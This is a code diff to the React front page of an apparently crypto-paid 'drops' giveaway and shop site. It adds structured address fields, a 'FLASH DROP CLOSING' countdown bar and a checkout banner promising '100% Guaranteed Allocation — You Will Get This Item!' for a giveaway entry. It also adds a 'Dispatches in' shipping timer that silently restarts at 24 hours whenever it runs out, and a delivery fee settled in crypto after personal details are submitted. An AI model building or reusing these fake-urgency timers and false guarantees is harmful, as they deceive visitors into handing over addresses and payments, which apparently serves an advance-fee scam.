@@ -27,6 +27,7 @@ import { Button } from "@/components/ui/button";
 import { Dialog, DialogContent, DialogDescription, DialogTitle } from "@/components/ui/dialog";
 import { Input } from "@/components/ui/input";
 import { QrCode } from "@/components/QrCode";
+import { COUNTRIES } from "@/lib/countries";
 import {
   fetchDrops,
   fetchSiteConfig,
@@ -80,6 +81,15 @@ export const Route = createFileRoute("/")({
 });
 
 function formatCountdown(totalSeconds: number) {
+  const remaining = Math.max(0, totalSeconds);
+  const days = Math.floor(remaining / 86400);
+  const hours = Math.floor((remaining % 86400) / 3600);
+  const minutes = Math.floor((remaining % 3600) / 60);
+  const seconds = remaining % 60;
+  return `${days}d ${String(hours).padStart(2, "0")}h ${String(minutes).padStart(2, "0")}m ${String(seconds).padStart(2, "0")}s`;
+}
+
+function formatShippingCountdown(totalSeconds: number) {
   const remaining = Math.max(0, totalSeconds);
   const days = Math.floor(remaining / 86400);
   const hours = Math.floor((remaining % 86400) / 3600);
@@ -163,6 +173,7 @@ function Index() {
 
   // ── UI state ─────────────────────────────────────────────────
   const [elapsed, setElapsed] = useState(0);
+  const [shippingSeconds, setShippingSeconds] = useState(86400 + 14400 + 1800); // Live ~28h shipping window
   const [category, setCategory] = useState<DropCategory>("All drops");
   const [selectedDrop, setSelectedDrop] = useState<DbDrop | null>(null);
   const [checkoutOpen, setCheckoutOpen] = useState(false);
@@ -173,7 +184,12 @@ function Index() {
   const [crypto, setCrypto] = useState("");
   const [email, setEmail] = useState("");
   const [fullName, setFullName] = useState("");
-  const [address, setAddress] = useState("");
+  const [street, setStreet] = useState("");
+  const [apartment, setApartment] = useState("");
+  const [city, setCity] = useState("");
+  const [stateProvince, setStateProvince] = useState("");
+  const [postalCode, setPostalCode] = useState("");
+  const [country, setCountry] = useState("United States");
   const [savedDrops, setSavedDrops] = useState<string[]>([]);
   const [toasts, setToasts] = useState<{ id: number; title: string; message: string }[]>([]);
   const [submitting, setSubmitting] = useState(false);
@@ -181,9 +197,25 @@ function Index() {
   const [checkoutDone, setCheckoutDone] = useState(false);
 
   useEffect(() => {
-    const tick = window.setInterval(() => setElapsed((c) => c + 1), 1000);
+    const tick = window.setInterval(() => {
+      setElapsed((c) => c + 1);
+      setShippingSeconds((s) => (s > 1 ? s - 1 : 86400));
+    }, 1000);
     return () => window.clearInterval(tick);
   }, []);
+
+  // Update browser favicon dynamically when site icon is changed in admin
+  useEffect(() => {
+    if (siteConfig.icon_url) {
+      let link = document.querySelector<HTMLLinkElement>("link[rel~='icon']");
+      if (!link) {
+        link = document.createElement("link");
+        link.rel = "icon";
+        document.head.appendChild(link);
+      }
+      link.href = siteConfig.icon_url;
+    }
+  }, [siteConfig.icon_url]);
 
   // Set default crypto when wallet loads
   useEffect(() => {
@@ -212,7 +244,34 @@ function Index() {
   const resetForm = () => {
     setEmail("");
     setFullName("");
-    setAddress("");
+    setStreet("");
+    setApartment("");
+    setCity("");
+    setStateProvince("");
+    setPostalCode("");
+    setCountry("United States");
+  };
+
+  const isAddressValid = Boolean(
+    street.trim() &&
+    city.trim() &&
+    stateProvince.trim() &&
+    postalCode.trim() &&
+    country.trim()
+  );
+
+  const getFormattedAddress = () => {
+    return [
+      street.trim(),
+      apartment.trim() ? `Apt ${apartment.trim()}` : "",
+      city.trim(),
+      `${stateProvince.trim()} ${postalCode.trim()}`.trim(),
+      country.trim(),
+    ].filter(Boolean).join(", ");
+  };
+
+  const getAddressNotes = () => {
+    return `Street: ${street.trim()} | Apt: ${apartment.trim()} | City: ${city.trim()} | State: ${stateProvince.trim()} | PostalCode: ${postalCode.trim()} | Country: ${country.trim()}`;
   };
 
   const openClaim = (drop: DbDrop) => {
@@ -254,12 +313,12 @@ function Index() {
         kind: "giveaway",
         email,
         full_name: fullName,
-        address,
+        address: getFormattedAddress(),
         status: "entered",
         crypto: "",
         amount: "",
         delivery_fee: selectedDrop.delivery_fee,
-        notes: "",
+        notes: getAddressNotes(),
       });
       setClaimDone(true);
     } catch (err) {
@@ -281,12 +340,12 @@ function Index() {
         kind: "shop",
         email,
         full_name: fullName,
-        address,
+        address: getFormattedAddress(),
         status: "entered",
         crypto,
         amount: selectedDrop.amount,
         delivery_fee: selectedDrop.delivery_fee,
-        notes: "",
+        notes: getAddressNotes(),
       });
       setCheckoutDone(true);
     } catch (err) {
@@ -309,7 +368,11 @@ function Index() {
   };
 
   const heroFeaturedDrop = drops[0] ?? null;
-  const heroLines = siteConfig.hero_headline.split("\n");
+  const heroLines = (siteConfig.hero_headline || "A little luck.\nA lot of love.")
+    .replace(/\\n/g, "\n")
+    .split("\n")
+    .map((l) => l.trim())
+    .filter(Boolean);
 
   if (loading) {
     return (
@@ -331,6 +394,63 @@ function Index() {
         <ArrowRight size={12} aria-hidden="true" />
       </div>
 
+      {/* Big Top Countdown Bar */}
+      {heroFeaturedDrop && (
+        <aside className="top-countdown-bar" aria-label="Limited drop countdown">
+          <div className="top-countdown-inner">
+            <div className="top-countdown-lead">
+              <span className="top-countdown-badge">
+                <span className="live-dot" /> FLASH DROP CLOSING
+              </span>
+              <span className="top-countdown-text">
+                <strong>{heroFeaturedDrop.name}</strong> · Claim window closing soon!
+              </span>
+            </div>
+            <div className="flex items-center gap-3">
+              <div className="top-countdown-timer">
+                {(() => {
+                  const rem = Math.max(0, heroFeaturedDrop.time_left - elapsed);
+                  const days = Math.floor(rem / 86400);
+                  const hours = Math.floor((rem % 86400) / 3600);
+                  const mins = Math.floor((rem % 3600) / 60);
+                  const secs = rem % 60;
+                  return (
+                    <>
+                      <div className="top-countdown-card">
+                        <span className="top-countdown-digit">{String(days).padStart(2, "0")}</span>
+                        <span className="top-countdown-unit-tag">days</span>
+                      </div>
+                      <span className="top-countdown-sep">:</span>
+                      <div className="top-countdown-card">
+                        <span className="top-countdown-digit">{String(hours).padStart(2, "0")}</span>
+                        <span className="top-countdown-unit-tag">hrs</span>
+                      </div>
+                      <span className="top-countdown-sep">:</span>
+                      <div className="top-countdown-card">
+                        <span className="top-countdown-digit">{String(mins).padStart(2, "0")}</span>
+                        <span className="top-countdown-unit-tag">min</span>
+                      </div>
+                      <span className="top-countdown-sep">:</span>
+                      <div className="top-countdown-card">
+                        <span className="top-countdown-digit">{String(secs).padStart(2, "0")}</span>
+                        <span className="top-countdown-unit-tag">sec</span>
+                      </div>
+                    </>
+                  );
+                })()}
+              </div>
+              <Button
+                size="sm"
+                className="top-countdown-cta"
+                onClick={() => beginDropAction(heroFeaturedDrop)}
+              >
+                <Ticket size={13} className="mr-1" /> Claim now
+              </Button>
+            </div>
+          </div>
+        </aside>
+      )}
+
       {/* Header */}
       <header className="site-header">
         <div className="header-inner">
@@ -339,7 +459,11 @@ function Index() {
               <img src={siteConfig.logo_url} alt={siteConfig.site_name} className="h-8 w-auto object-contain" />
             ) : (
               <>
-                <span className="brand-symbol"><Zap size={17} fill="currentColor" /></span>
+                {siteConfig.icon_url ? (
+                  <img src={siteConfig.icon_url} alt="" className="h-7 w-7 rounded object-contain" />
+                ) : (
+                  <span className="brand-symbol"><Zap size={17} fill="currentColor" /></span>
+                )}
                 <span>{siteConfig.site_name}<span className="text-primary">.</span></span>
               </>
             )}
@@ -373,8 +497,7 @@ function Index() {
               <span className="eyebrow hero-eyebrow"><span className="live-dot" /> THE DROP OF THE WEEK</span>
               <h1 className="hero-title" id="hero-heading">
                 {heroLines.map((line, i) => (
-                  <span key={i}>
-                    {i > 0 && <br />}
+                  <span key={i} className="block">
                     {i === heroLines.length - 1 ? <em>{line}</em> : line}
                   </span>
                 ))}
@@ -620,6 +743,27 @@ function Index() {
                 Fill in your details to claim <strong>{selectedDrop?.name}</strong>. You will pay the delivery fee after.
               </DialogDescription>
 
+              {/* Reassurance Guaranteed Banner */}
+              <div className="guaranteed-box">
+                <CheckCircle2 size={20} className="shrink-0 text-emerald-600 mt-0.5" />
+                <div className="text-xs leading-relaxed">
+                  <strong className="block text-emerald-950 font-bold">100% Guaranteed Allocation — You Will Get This Item!</strong>
+                  <span>Your entry qualifies and reserves this item directly for you. Complete your shipping address below to secure dispatch to your doorstep.</span>
+                </div>
+              </div>
+
+              {/* Live Shipping Day Countdown */}
+              <div className="shipping-timer-box">
+                <div className="flex items-center gap-2.5">
+                  <Clock3 size={16} className="text-primary shrink-0" />
+                  <div>
+                    <span className="text-[10px] font-bold uppercase tracking-wider text-muted-foreground block">Estimated Dispatch</span>
+                    <span className="text-xs font-bold text-foreground">Dispatches in {formatShippingCountdown(shippingSeconds)}</span>
+                  </div>
+                </div>
+                <span className="rounded-full bg-primary/10 px-2.5 py-1 text-[10px] font-extrabold text-primary">Tracked & Insured</span>
+              </div>
+
               {selectedDrop && (
                 <div className="checkout-summary">
                   {selectedDrop.image_url ? (
@@ -643,15 +787,55 @@ function Index() {
                 <label className="checkout-label" htmlFor="claim-name">Full name</label>
                 <Input className="checkout-input" id="claim-name" placeholder="Your full name" value={fullName} onChange={(e) => setFullName(e.target.value)} />
               </div>
-              <div className="checkout-field">
-                <label className="checkout-label" htmlFor="claim-address">Shipping address</label>
-                <Input className="checkout-input" id="claim-address" placeholder="Street, city, postcode, country" value={address} onChange={(e) => setAddress(e.target.value)} />
+
+              {/* Structured Shipping Address */}
+              <div className="grid gap-2.5 pt-1">
+                <span className="text-[11px] font-extrabold uppercase tracking-wide text-foreground">Shipping address</span>
+
+                <div className="checkout-field">
+                  <label className="checkout-label" htmlFor="claim-street">Street address</label>
+                  <Input className="checkout-input" id="claim-street" placeholder="House number and street name" value={street} onChange={(e) => setStreet(e.target.value)} />
+                </div>
+
+                <div className="checkout-field">
+                  <label className="checkout-label" htmlFor="claim-apt">Apartment, suite, unit (optional)</label>
+                  <Input className="checkout-input" id="claim-apt" placeholder="Apt, Suite, Unit, Building (optional)" value={apartment} onChange={(e) => setApartment(e.target.value)} />
+                </div>
+
+                <div className="grid grid-cols-2 gap-2">
+                  <div className="checkout-field">
+                    <label className="checkout-label" htmlFor="claim-city">City</label>
+                    <Input className="checkout-input" id="claim-city" placeholder="City" value={city} onChange={(e) => setCity(e.target.value)} />
+                  </div>
+                  <div className="checkout-field">
+                    <label className="checkout-label" htmlFor="claim-state">State / Province / Region</label>
+                    <Input className="checkout-input" id="claim-state" placeholder="State or Region" value={stateProvince} onChange={(e) => setStateProvince(e.target.value)} />
+                  </div>
+                </div>
+
+                <div className="grid grid-cols-2 gap-2">
+                  <div className="checkout-field">
+                    <label className="checkout-label" htmlFor="claim-postcode">Postal / ZIP code</label>
+                    <Input className="checkout-input" id="claim-postcode" placeholder="Postal / ZIP" value={postalCode} onChange={(e) => setPostalCode(e.target.value)} />
+                  </div>
+                  <div className="checkout-field">
+                    <label className="checkout-label" htmlFor="claim-country">Country</label>
+                    <select className="checkout-select" id="claim-country" value={country} onChange={(e) => setCountry(e.target.value)}>
+                      {COUNTRIES.map((c) => (
+                        <option key={c} value={c}>{c}</option>
+                      ))}
+                    </select>
+                  </div>
+                </div>
               </div>
 
               {selectedDrop && (
                 <div className="flex items-center justify-between rounded-md bg-muted px-3 py-2 text-xs">
-                  <span className="text-muted-foreground">Delivery fee (paid after)</span>
-                  <strong>{selectedDrop.delivery_fee}</strong>
+                  <div>
+                    <span className="font-semibold text-foreground">Delivery fee (paid after)</span>
+                    <span className="block text-[10px] text-muted-foreground">Settled with crypto after submitting details</span>
+                  </div>
+                  <strong className="text-sm">{selectedDrop.delivery_fee}</strong>
                 </div>
               )}
 
@@ -662,11 +846,11 @@ function Index() {
 
               <Button
                 className="h-11 w-full rounded-full font-bold"
-                disabled={!email.includes("@") || !fullName.trim() || !address.trim() || submitting}
+                disabled={!email.includes("@") || !fullName.trim() || !isAddressValid || submitting}
                 onClick={submitClaim}
               >
                 {submitting ? <Loader2 size={16} className="animate-spin" /> : <Gift size={16} />}
-                {submitting ? "Saving..." : "Claim giveaway"}
+                {submitting ? "Reserving your drop..." : "Claim giveaway"}
                 {!submitting && <ArrowRight size={15} />}
               </Button>
             </>
@@ -746,9 +930,46 @@ function Index() {
                 <label className="checkout-label" htmlFor="shop-name">Full name</label>
                 <Input className="checkout-input" id="shop-name" placeholder="Your full name" value={fullName} onChange={(e) => setFullName(e.target.value)} />
               </div>
-              <div className="checkout-field">
-                <label className="checkout-label" htmlFor="shop-address">Shipping address</label>
-                <Input className="checkout-input" id="shop-address" placeholder="Street, city, postcode, country" value={address} onChange={(e) => setAddress(e.target.value)} />
+
+              {/* Structured Shipping Address */}
+              <div className="grid gap-2.5 pt-1">
+                <span className="text-[11px] font-extrabold uppercase tracking-wide text-foreground">Shipping address</span>
+
+                <div className="checkout-field">
+                  <label className="checkout-label" htmlFor="shop-street">Street address</label>
+                  <Input className="checkout-input" id="shop-street" placeholder="House number and street name" value={street} onChange={(e) => setStreet(e.target.value)} />
+                </div>
+
+                <div className="checkout-field">
+                  <label className="checkout-label" htmlFor="shop-apt">Apartment, suite, unit (optional)</label>
+                  <Input className="checkout-input" id="shop-apt" placeholder="Apt, Suite, Unit, Building (optional)" value={apartment} onChange={(e) => setApartment(e.target.value)} />
+                </div>
+
+                <div className="grid grid-cols-2 gap-2">
+                  <div className="checkout-field">
+                    <label className="checkout-label" htmlFor="shop-city">City</label>
+                    <Input className="checkout-input" id="shop-city" placeholder="City" value={city} onChange={(e) => setCity(e.target.value)} />
+                  </div>
+                  <div className="checkout-field">
+                    <label className="checkout-label" htmlFor="shop-state">State / Province / Region</label>
+                    <Input className="checkout-input" id="shop-state" placeholder="State or Region" value={stateProvince} onChange={(e) => setStateProvince(e.target.value)} />
+                  </div>
+                </div>
+
+                <div className="grid grid-cols-2 gap-2">
+                  <div className="checkout-field">
+                    <label className="checkout-label" htmlFor="shop-postcode">Postal / ZIP code</label>
+                    <Input className="checkout-input" id="shop-postcode" placeholder="Postal / ZIP" value={postalCode} onChange={(e) => setPostalCode(e.target.value)} />
+                  </div>
+                  <div className="checkout-field">
+                    <label className="checkout-label" htmlFor="shop-country">Country</label>
+                    <select className="checkout-select" id="shop-country" value={country} onChange={(e) => setCountry(e.target.value)}>
+                      {COUNTRIES.map((c) => (
+                        <option key={c} value={c}>{c}</option>
+                      ))}
+                    </select>
+                  </div>
+                </div>
               </div>
 
               <div className="checkout-field">
@@ -784,7 +1005,7 @@ function Index() {
 
               <Button
                 className="h-11 w-full rounded-full font-bold"
-                disabled={!email.includes("@") || !fullName.trim() || !address.trim() || !walletAddress || submitting}
+                disabled={!email.includes("@") || !fullName.trim() || !isAddressValid || !walletAddress || submitting}
                 onClick={submitCheckout}
               >
                 {submitting ? <Loader2 size={16} className="animate-spin" /> : <Wallet size={16} />}
